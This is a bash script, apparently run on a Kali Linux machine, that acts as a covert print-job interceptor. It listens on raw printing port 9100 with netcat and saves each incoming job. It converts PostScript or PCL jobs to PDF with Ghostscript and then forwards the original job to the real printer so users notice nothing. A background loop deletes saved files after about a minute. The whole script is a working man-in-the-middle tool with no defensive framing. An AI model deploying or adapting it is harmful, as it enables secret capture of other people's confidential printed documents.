#!/bin/bash

SAVE_DIR="/home/kali/Desktop/API/Watch"
FORWARD_IP="192.168.1.50"     # Replace with your actual printer IP
FORWARD_PORT=9100

mkdir -p "$SAVE_DIR"

echo "[+] Print interceptor is running on port 9100..."

# Background auto-cleaner
(
    while true; do
        find "$SAVE_DIR" -type f \( -name "*.pdf" -o -name "*.raw" -o -name "*.txt" \) -mmin +1 -delete
        sleep 10
    done
) &

# Loop to accept print jobs
while true; do
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    RAW_FILE="$SAVE_DIR/job_$TIMESTAMP.raw"
    PDF_FILE="$SAVE_DIR/job_$TIMESTAMP.pdf"

    # Launch listener and immediately fork a processor in background
    nc -l -p 9100 > "$RAW_FILE" &

    # Save PID and wait for netcat to finish
    NC_PID=$!
    wait $NC_PID

    # Handle job in background (to not block the listener loop)
    (
        if [[ ! -s "$RAW_FILE" || $(stat -c%s "$RAW_FILE") -lt 100 ]]; then
            echo "[!] Ignored empty or very small file: $RAW_FILE"
            rm -f "$RAW_FILE"
            exit 0
        fi

        FILETYPE=$(file "$RAW_FILE")
        echo "[*] Detected format: $FILETYPE"

        if echo "$FILETYPE" | grep -q "PostScript"; then
            echo "[*] Converting PostScript to PDF..."
            gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile="$PDF_FILE" "$RAW_FILE"
        elif echo "$FILETYPE" | grep -q "PCL"; then
            echo "[*] Converting PCL to PDF..."
            pcl6 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile="$PDF_FILE" "$RAW_FILE"
        else
            echo "[!] Unknown format — skipping PDF conversion"
        fi

        echo "[*] Forwarding to printer $FORWARD_IP..."
        cat "$RAW_FILE" | nc "$FORWARD_IP" "$FORWARD_PORT"

        echo "[✔] Job handled: $RAW_FILE → $PDF_FILE"
    ) &

    # No sleep — we instantly start listening again
done
